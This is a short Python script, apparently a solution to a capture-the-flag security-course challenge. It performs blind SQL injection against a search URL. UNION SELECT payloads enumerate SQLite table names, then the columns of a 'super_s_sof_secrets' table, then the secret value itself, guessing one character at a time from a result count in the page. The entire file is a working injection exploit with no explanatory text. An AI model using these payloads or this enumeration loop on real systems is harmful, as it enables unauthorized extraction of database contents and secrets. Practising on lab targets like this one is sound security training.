import requests
import string

URL = "http://ssof2526.challenges.cwte.me:25262/?search="

session = requests.Session()
session.get(URL) 
LETTERS = list(string.ascii_letters) + ["-", "_", "{", "}"," ",":"]

def find_tables_query(substring, index):
    return f"q' UNION SELECT tbl_name, type, NULL FROM 'sqlite_master' WHERE type='table' AND substr(tbl_name,1,{index}) == '{substring}'; --"


def find_columns(substring, index):
    return f"q' UNION SELECT name, NULL, NULL FROM pragma_table_info('super_s_sof_secrets') WHERE substr(name,1,{index}) == '{substring}'; --"


def find_data(substring, index):
    return f"q' UNION SELECT secret, NULL, NULL FROM 'super_s_sof_secrets' WHERE substr(secret,1,{index}) == '{substring}'; --"


def find_tables(query):
    table_start = []
    table_names = []
    for l in LETTERS:
        response = session.get(URL + query(l,1))
        results = response.text.split("Found ")[1].split(" ")[0]
        if results != "0":
            table_start.append(l)
            print("Found starting with:", l)
    
    while len(table_start) > 0:
        auxname = table_start.pop(0)
        for l in LETTERS:
            response = session.get(URL + query(auxname + l, len(auxname) + 1))
            results = response.text.split("Found ")[1].split(" ")[0]
            if results != "0":
                new_name = auxname + l
                table_start.append(new_name)
                print("Found name so far:", new_name)
                if results == "1":
                    table_names.append(new_name)
                    print("Complete name found:", new_name)
    print("All names found:", table_names)
    
find_tables(find_tables_query)       
find_tables(find_columns)        
find_tables(find_data)
